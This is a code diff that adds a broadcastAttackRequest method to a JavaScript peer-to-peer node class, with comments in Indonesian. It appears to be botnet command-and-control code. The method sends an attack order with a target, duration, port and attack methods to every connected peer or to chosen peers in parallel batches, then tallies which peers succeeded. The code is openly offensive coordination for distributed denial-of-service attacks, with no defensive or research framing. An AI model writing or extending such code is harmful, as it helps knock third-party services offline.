@@ -1427,6 +1427,95 @@ class P2PHybridNode extends EventEmitter {
     return sent;
   }
   
+  async broadcastAttackRequest({ target, time, port, methods, targetPeerIds = null, maxParallel = 5 }) {
+    if (this.peers.size === 0) {
+      console.log('[P2P-ATTACK-BROADCAST] No peers connected');
+      return {
+        success: false,
+        error: 'No peers connected',
+        summary: { totalTargets: 0, success: 0, failed: 0 },
+        results: []
+      };
+    }
+
+    // Tentukan list target peers
+    let peersToUse = [];
+    if (Array.isArray(targetPeerIds) && targetPeerIds.length > 0) {
+      peersToUse = targetPeerIds
+        .filter(id => this.peers.has(id))
+        .map(id => ({ nodeId: id, peer: this.peers.get(id) }));
+    } else {
+      // Default: semua peer DIRECT / REVERSE yang terkoneksi
+      peersToUse = Array.from(this.peers.entries())
+        .filter(([_, peer]) => peer.mode === 'DIRECT' || peer.mode === 'REVERSE')
+        .map(([nodeId, peer]) => ({ nodeId, peer }));
+    }
+
+    if (peersToUse.length === 0) {
+      console.log('[P2P-ATTACK-BROADCAST] No eligible peers for broadcast');
+      return {
+        success: false,
+        error: 'No eligible peers',
+        summary: { totalTargets: 0, success: 0, failed: 0 },
+        results: []
+      };
+    }
+
+    console.log(`[P2P-ATTACK-BROADCAST] Broadcasting attack to ${peersToUse.length} peer(s)`);
+
+    const results = [];
+    let successCount = 0;
+    let failedCount = 0;
+
+    // Jalankan dalam batch paralel untuk cepat tapi tidak terlalu brutal
+    for (let i = 0; i < peersToUse.length; i += maxParallel) {
+      const batch = peersToUse.slice(i, i + maxParallel);
+
+      const batchResults = await Promise.all(
+        batch.map(async ({ nodeId }) => {
+          try {
+            const res = await this.requestAttackFromPeer(nodeId, target, time, port, methods);
+            const ok = res && res.success;
+            if (ok) successCount++;
+            else failedCount++;
+
+            return {
+              nodeId,
+              success: !!res.success,
+              error: res.success ? null : (res.error || 'Unknown error'),
+              response: res
+            };
+          } catch (err) {
+            failedCount++;
+            console.error(`[P2P-ATTACK-BROADCAST] Error requesting attack from ${nodeId}:`, err.message);
+            return {
+              nodeId,
+              success: false,
+              error: err.message,
+              response: null
+            };
+          }
+        })
+      );
+
+      results.push(...batchResults);
+    }
+
+    const summary = {
+      totalTargets: peersToUse.length,
+      success: successCount,
+      failed: failedCount
+    };
+
+    console.log('[P2P-ATTACK-BROADCAST] Finished:', summary);
+
+    return {
+      success: successCount > 0,
+      summary,
+      results
+    };
+  }
+  
   async requestAttackFromPeer(nodeId, target, time, port, methods) {
     const requestId = crypto.randomBytes(8).toString('hex');
     
